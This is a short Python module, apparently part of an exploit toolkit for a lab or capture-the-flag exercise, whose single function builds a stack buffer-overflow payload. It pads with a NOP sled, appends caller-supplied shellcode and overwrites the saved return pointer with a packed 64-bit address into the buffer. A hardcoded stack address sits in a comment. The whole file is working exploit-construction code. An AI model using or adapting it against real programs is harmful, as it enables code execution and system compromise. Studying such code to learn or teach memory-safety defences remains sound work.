import struct
from pathlib import Path

from .config import BUFFER_ADDR_OFFSET

def generate_payload(buffer_addr: int,
                     saved_rip_offset: int,
                     shellcode: bytes) -> bytes:
    """Payload construction: combines NOP sled, shellcode, and return address."""
    filler_size = saved_rip_offset - len(shellcode)
    filler = b'\x90' * filler_size  # NOP sled
    #buffer_addr = 0x7fffffffbc41
    return filler + shellcode + struct.pack('<Q', buffer_addr + BUFFER_ADDR_OFFSET)
